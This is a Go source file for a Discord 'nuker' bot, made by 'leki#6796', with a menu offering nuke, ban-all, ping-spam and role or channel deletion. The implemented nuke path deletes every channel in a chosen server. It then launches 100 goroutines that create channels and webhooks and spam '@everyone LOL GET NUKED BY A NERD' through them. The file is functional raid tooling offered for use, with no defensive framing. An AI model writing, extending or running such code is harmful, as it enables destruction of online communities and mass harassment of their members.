package main

import (
	"bufio"
	"fmt"
	"github.com/bwmarrin/discordgo"
	"log"
	"net/http"
	"os"
	"strings"
	"time"
)

func (h *How) Menu(dg *discordgo.Session) {

	log.Println(`
			__ __   ___   __    __        
			|  |  | /   \ |  |__|  |       
			|  |  ||     ||  |  |  |       
			|  _  ||  O  ||  |  |  |       
			|  |  ||     ||  '  '  |__  __ 
			|  |  ||     | \      /|  ||  |
			|__|__| \___/   \_/\_/ |__||__|
			Made by leki#6796
	[	[1] - How to use    [2] - Nuke    [3] - Ban all   ]
	[	[4] - Ping spam     [5] - Delete roles            [6] - Delete channels ]
	`)
	input := bufio.NewReader(os.Stdin)
	text, _ := input.ReadString('\n')
	if strings.HasPrefix(text, "1") {
		fmt.Println("Simply choose one of the options.")
		time.Sleep(time.Second * 3)
	} else if strings.HasPrefix(text, "2") {
		log.Println("What guild are you trying to create channels in?")
		guilds := dg.State.Guilds
		for _, guild := range guilds {
			fmt.Println(guild.Name)
		}
		ch, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		var guildID string
		var guildz *discordgo.Guild
		for i, guild := range guilds {
			if guild.Name[:1] == ch[:1] {
				guildID = guild.ID
				guildz = guilds[i]
			} else {
				log.Println("That guild doesn't exist.", guild.Name, ch)
				return
			}
		}

		log.Println(guildID)
		fmt.Println("Starting threads")
		h.DeleteChannels(dg, guildz)

		for i := 0; i < 100; i++ {

			go h.CreateChannels(dg, guildID, "how-do-i-code") // use - instead of space or its finna break
		}

	}
}
func (h *How) DeleteChannels(dg *discordgo.Session, guild *discordgo.Guild) {
loop:
	for _, channel := range guild.Channels {
		_, err := dg.ChannelDelete(channel.ID)
		if err != nil {
			goto loop

		} else {
			h.InfoLog.Println("Deleted channel", channel.ID)
		}
	}
}

var webhooks []string

func (h *How) CreateChannels(dg *discordgo.Session, guildID string, channelName string) {

	channel, err := dg.GuildChannelCreate(guildID, channelName, discordgo.ChannelType(0))
	if err != nil {
		h.ErrorLog.Println(err)
	}

	hook, err := dg.WebhookCreate(channel.ID, "How-to-code-i-forgor", "https://i.ytimg.com/vi/DqZZRGXuHF8/maxresdefault.jpg")
	h.InfoLog.Println("Created channel & webhook", channelName, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)
	webhooks = append(webhooks, "https://discord.com/api/webhooks/"+hook.ID+"/"+hook.Token)

	if err != nil {
		h.ErrorLog.Println(err)
	}
	for _, webhook := range webhooks {
		req, err := http.Post(webhook, "application/json", strings.NewReader(`{"content":"@everyone LOL GET NUKED BY A NERD"}`))
		if err != nil {
			h.ErrorLog.Println(err)
		}
		h.InfoLog.Println("Sent message to webhook", webhook, req.Status)
	}

}
